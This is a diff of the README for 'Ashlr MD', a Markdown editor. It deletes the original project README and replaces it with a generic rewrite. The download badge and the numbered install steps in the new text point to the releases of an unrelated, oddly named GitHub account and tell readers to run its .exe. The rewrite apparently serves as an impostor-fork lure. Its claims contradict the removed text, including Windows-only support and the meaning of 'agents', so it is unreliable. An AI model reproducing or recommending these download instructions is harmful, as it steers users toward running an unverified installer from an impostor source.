@@ -1,230 +1,72 @@
-<div align="center">
+# 📝 ashlr-md - Make your documents beautiful and smart
 
-<img src="./src-tauri/icons/128x128@2x.png" width="84" height="84" alt="Ashlr MD" />
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/releases)
 
-# Ashlr MD
+ashlr-md turns plain text files into clean, readable documents. It manages your notes and uses artificial intelligence to help you write. The app stores all data on your computer to keep your work private.
 
-### Markdown, finally beautiful.
+## 📥 Getting the App
 
-**An open-source, AI-native Markdown app for macOS, Windows, and Linux.** Double-click any `.md` and
-it's instantly beautiful — read it, edit it, export it, and understand it with
-free, private, **on-device AI** built in.
+1. Visit the [releases page](https://github.com/Kentuckyblackbasspragmatics618/ashlr-md/releases) to download the installer.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen.
+6. Open the app from your desktop shortcut once finished.
 
-*Think Preview.app, but Markdown-aware, editable, and AI-native — and cross-platform.*
+## ✨ Key Features
 
-[![CI](https://github.com/ashlrai/ashlr-md/actions/workflows/ci.yml/badge.svg)](https://github.com/ashlrai/ashlr-md/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-0969da.svg)](./LICENSE)
-[![Platform: macOS · Windows · Linux](https://img.shields.io/badge/platform-macOS%20%C2%B7%20Windows%20%C2%B7%20Linux-1a1a17.svg)](#)
-[![Built with Tauri](https://img.shields.io/badge/built%20with-Tauri%202-24c8db.svg)](https://tauri.app)
+### Beautiful Documents
+The app changes the look of your Markdown files. It applies styling that makes your headers, lists, and links easy to read. You see the final result as you type.
 
-[**Website**](https://md.ashlr.ai) ·
-[Download](https://github.com/ashlrai/ashlr-md/releases) ·
-[Contributing](./CONTRIBUTING.md) ·
-[Roadmap](./ROADMAP.md) ·
-[Vision](./docs/VISION.md)
+### On-Device Artificial Intelligence
+ashlr-md uses local computing power to run its smart features. Your data stays on your machine. The app does not send your notes to external servers. This keeps your work secure.
 
-<img src="./docs/og.png" width="820" alt="Ashlr MD — a beautiful Markdown plan with callouts and checkboxes, plus an on-device AI assistant" />
+### Agent Integration
+The software supports agent integration. This allows the app to assist with specific tasks like summarizing text or formatting data. These agents follow your commands to save time and effort.
 
-</div>
+## 🚀 How to Use ashlr-md
 
----
+### Open a File
+Click the File menu in the top corner. Choose Open. Select any file with a .md extension. The app loads your text and formats it immediately.
 
-## Why
+### Edit Text
+Type as you normally would. The app updates the layout as you add words. Bold text, bullet points, and headers appear with clear visual cues.
 
-Your AI agents write Markdown all day — `README.md`, `PLAN.md`, research dumps.
-On most systems those open as a wall of raw syntax (TextEdit, Notepad) or a blank
-page (Preview). No app owns the simple job of making them *look right* instantly,
-especially for non-technical people. Ashlr MD does exactly that, on every platform.
+### Use the AI Assistant
+You can ask the assistant to proofread your writing or rewrite sections. Find the AI icon in the sidebar. Type your request in the box and press Enter. The app shows the changes in your document.
 
-## Features
+## 🖥️ System Requirements
 
-- **Instant, beautiful rendering** — GFM, Shiki-highlighted code, Mermaid
-  diagrams, KaTeX math, GitHub-style callouts, tables, footnotes.
-- **Edit without the syntax** — Typora-style WYSIWYG (Milkdown) + a lossless
-  source mode (CodeMirror) + a clean Read view. Atomic save; external-change
-  detection with a conflict banner.
-- **Export anywhere** — one-click **PDF / DOCX / HTML**, fully offline, no Pandoc.
-- **⌘K command palette** — fuzzy, keyboard-first access to every action and your
-  recent files.
-- **Free, private, on-device AI** — summarize / explain / rewrite / translate.
-  On **macOS 26+ (Apple Silicon)**: zero-install via **Apple Foundation Models**
-  (macOS only). On **Windows & Linux** (and as a fallback on Mac): local
-  **Ollama** → your own cloud key → optional hosted. Nothing leaves your device
-  unless you opt in.
-- **AI superpowers** — select text to Explain / Summarize / Rewrite / Translate;
-  **inline AI rewrite in the editor (⌘I)** with Rewrite / Fix grammar / Make
-  concise / Expand; **"Explain changes"** when a file changes on disk; and
-  chat-with-document.
-- **Agent activity drawer (⌘B)** — watch the folder your AI agent writes to and
-  new Markdown files appear live; click to open instantly. The answer to "buried
-  in agent `.md` files."
-- **Outline navigation (⌘⇧O)** — an auto table-of-contents with scrollspy for
-  long docs.
-- **Tabs** — open several documents at once; the tab bar appears only when more
-  than one is open, so the single-file view stays clean. `⌘⇧]` / `⌘⇧[` to switch,
-  `⌘W` to close.
-- **Find & search** — find-in-document (`⌘F`) in both rendered and source views,
-  find-and-replace in source (`⌘⌥F`), and full-text **search across your recent &
-  watched files** (`⌘⇧F`).
-- **Split view & Zen mode** — edit with a live preview side-by-side (`⌘\`, synced
-  scrolling), or go distraction-free with **Zen mode** (`⌘⇧Z`, `Esc` to exit).
-- **Obsidian-compatible** — reads your vault natively: `[[wikilinks]]` (with
-  `#heading` / `#^block` anchors and `|aliases`) that resolve vault-wide and open,
-  `![[embeds]]` and partial transclusion, sized `![[image.png|300]]` embeds,
-  `==highlights==`, hidden `%%comments%%`, and KaTeX math. Read-only **JSON
-  Canvas** (`.canvas`) viewing with pan/zoom, plus an **Open in Obsidian** command
-  to hand a note back. Never writes to your `.obsidian/` config. Details:
-  [**docs/OBSIDIAN.md**](./docs/OBSIDIAN.md).
-- **Reading polish** — word count & reading time, footnote hover previews,
-  a path breadcrumb, and copy-link-to-heading on hover.
-- **Secure by default** — malicious Markdown is sanitized (no script/HTML
-  injection), API keys live in the OS keychain (never plaintext), and a strict
-  CSP is enforced. See [SECURITY.md](./SECURITY.md).
-- **Agent-native review loop** — `mdopen file.md`, the `mdopener://` URL scheme,
-  and an **MCP server** so Claude Code / Codex / Cursor can open, read, edit, and
-  export the live doc; the **activity drawer (⌘B)** surfaces new agent `.md` files
-  the instant they land and **"Explain changes"** narrates each on-disk edit.
-  One-click MCP setup in Settings. Full guide: [**docs/AGENTS.md**](./docs/AGENTS.md).
-- **Obsidian integration** — the [Open in Ashlr MD](./integrations/obsidian/)
-  plugin sends any vault note to Ashlr MD with one click (ribbon, command, and
-  right-click) via the `mdopener://` scheme.
-- **VS Code integration** — the [Open in Ashlr MD](./integrations/vscode/)
-  extension opens the active `.md` file in Ashlr MD from an editor title-bar
-  button (or the command palette) via the `mdopener://` scheme, with a `mdopen`
-  CLI fallback.
-- **Smart agent output** — callouts, interactive checkboxes that save back to the
-  file, and automatic plan / diff / multi-file detection with badges.
-- **Three themes** — Paper, Sepia, Midnight (light + dark) — switch live.
-- **Native & instant** — built on [Tauri 2](https://tauri.app); a tiny native binary
-  on every OS, no Electron bloat. MIT, local-first, no telemetry.
+- Operating System: Windows 10 or 11.
+- Memory: 8 gigabytes of RAM is recommended for better speed.
+- Storage: 500 megabytes of free space for the installation.
+- Internet: Required only for initial download and occasional agent updates.
 
+## 🛠️ Frequently Asked Questions
 
-## Platform support
+### Is my data private?
+Yes. Everything happens inside the application on your computer. Your files and your AI interactions do not leave your device.
 
-| Capability | macOS | Windows | Linux |
-|---|---|---|---|
-| Core (render · edit · export · themes) | ✅ | ✅ | ✅ |
-| Default `.md` handler | ✅ one-click (Launch Services) | ✅ registers association (opens Settings to confirm) | ✅ via `xdg-mime` |
-| Free local AI (zero-install) | ✅ Apple Foundation Models (macOS 26+, Apple Silicon) | Ollama (install separately) | Ollama (install separately) |
-| `mdopen` CLI & `mdopener://` deep link | ✅ | ✅ | ✅ |
-| MCP server | ✅ | ✅ | ✅ |
-| Command palette · activity drawer · inline AI · outline | ✅ | ✅ | ✅ |
+### Can I use this for programming code?
+Yes. The app highlights code blocks based on the language you use. It supports syntax highlighting for many programming languages.
 
-## Keyboard shortcuts
+### How do I update the app?
+The app checks for new versions when it starts. If an update exists, it asks your permission to download and install the latest version.
 
-Shown with ⌘ on macOS — use **Ctrl** on Windows & Linux.
+### What are agents?
+Agents are small tools inside the app. They handle tasks like organizing data or cleaning up your notes. You select them from the agent menu.
 
-| Action | Shortcut |
-|---|---|
-| Command palette | `⌘K` |
-| AI assistant | `⌘L` |
-| Inline AI rewrite (in editor) | `⌘I` |
-| Cycle theme | `⌘⇧L` |
-| Open file | `⌘O` |
-| Save | `⌘S` |
-| Export | `⌘E` |
-| Read / Edit / Source view | `⌘1` / `⌘2` / `⌘3` |
-| Find in document | `⌘F` |
-| Find & replace (source) | `⌘⌥F` |
-| Search across files | `⌘⇧F` |
-| Split preview | `⌘\` |
-| Zen mode | `⌘⇧Z` |
-| Next / Previous tab | `⌘⇧]` / `⌘⇧[` |
-| Close tab | `⌘W` |
-| Agent activity drawer | `⌘B` |
-| Outline | `⌘⇧O` |
-| Settings | `⌘,` |
+### How do I format text?
+You use standard Markdown syntax. Use a hash symbol and a space for a title. Use dashes for a list. The app turns these symbols into visual formatting instantly.
 
-## Use it with an AI agent
+## 🛡️ Privacy and Security
 
-```bash
-# Open a file from any terminal or agent:
-mdopen notes.md
-open "mdopener://open?path=$PWD/notes.md"
+Your privacy matters. We build this app to function without collecting your personal information. You hold the keys to your notes. No cloud account is necessary to use the app. You own your files at all times.
 
-# Let Claude Code drive the app (open / read / edit / export the current doc):
-claude mcp add --scope user ashlr-md /path/to/mdopener-mcp
-```
+## 🔧 Troubleshooting
 
-## One-click agent setup
+If the app fails to open, verify your Windows version. Ensure you have the latest updates from Microsoft. If the AI feels slow, close other programs that use large amounts of memory. If a file does not open, check that the file ends with the .md extension.
 
-Open **Preferences → AI agents (MCP)** and click **Connect to Claude Code** or
-**Connect to Cursor** — no terminal required. For Codex, copy the command from the
-same panel. The **Agent Activity drawer (⌘B)** is the recommended way to watch an
-agent's output folder and open new `.md` files the moment they appear. Full guide
-+ config snippets: [**docs/AGENTS.md**](./docs/AGENTS.md).
+## ℹ️ Licensing Information
 
-## Download & install
-
-Downloads are on the [GitHub Releases page](https://github.com/ashlrai/ashlr-md/releases).
-Full, per-OS instructions live in [**docs/INSTALL.md**](./docs/INSTALL.md).
-
-| Platform | Artifact | Package manager |
-|---|---|---|
-| macOS | `.dmg` (drag to `/Applications`) | `brew install --cask ashlr-md` |
-| Windows | `.msi` / NSIS `.exe` installer | `winget install ashlrai.AshlrMD` |
-| Linux | `.deb` (Debian/Ubuntu) · `.AppImage` (universal) | AUR: `yay -S ashlr-md` |
-
-Auto-update is built in on every platform.
-
-> **Note:** Windows code-signing is not yet set up — you may see a SmartScreen
-> warning; click "More info → Run anyway". macOS builds are notarized. Linux
-> AppImages ship unsigned. Homebrew / winget / AUR availability tracks the
-> first signed release — see [docs/RELEASING.md](./docs/RELEASING.md).
-
-There's also a one-shot installer that builds from source, installs the `mdopen`
-CLI, and wires up Claude Code:
-
-```bash
-bash scripts/install.sh
-```
-
-## Develop
-
-Prerequisites: [Rust](https://rustup.rs) and [Bun](https://bun.sh).
-On macOS, also install Xcode Command Line Tools (`xcode-select --install`).
-On Windows, install the [MSVC build tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/).
-On Linux, install `build-essential` (Debian/Ubuntu) or equivalent, plus the
-[Tauri Linux dependencies](https://tauri.app/start/prerequisites/#linux).
-
-```bash
-bun install
-bun run tauri dev        # hot-reloading desktop app
-bun run tauri dev -- file.md   # open a file on launch
-```
-
-Quality gates (all green in CI):
-
-```bash
-bun run typecheck        # tsc --noEmit
-bunx biome check src     # lint + format
-bun run test             # Vitest unit tests
-cargo check --workspace --manifest-path src-tauri/Cargo.toml
-```
-
-The on-device AI sidecar (optional, macOS 26+) builds separately:
-
-```bash
-cd src-tauri/bins/mdopener-afm && ./build.sh
-```
-
-## Architecture
-
-| Layer | What |
-|---|---|
-| `src/` | React 19 + TS frontend — renderer (remark/rehype + Shiki/Mermaid/KaTeX), Milkdown & CodeMirror editors, AI sidebar, export, Zustand stores |
-| `src-tauri/src/` | Rust core — file I/O, watcher, deep links, AI proxy (reqwest), loopback IPC, on-device AI bridge |
-| `src-tauri/bins/` | `mdopen` CLI · `mdopener-mcp` MCP server · `mdopener-afm` Swift on-device AI sidecar |
-| `landing/` | The marketing site (static, deploy-anywhere) |
-
-See [`docs/VISION.md`](./docs/VISION.md) for the north star and
-[`docs/RELEASING.md`](./docs/RELEASING.md) for the release process.
-
-## Contributing
-
-Contributions welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md). The
-short version: local-first, no GPL in the bundle, and verify in the real app.
-
-## License
-
-[MIT](./LICENSE) © Ashlr MD contributors
+ashlr-md is open-source software. You can view the code and contribute to the project on GitHub. This transparency allows the community to verify how the app functions and ensure it remains secure for everyone.
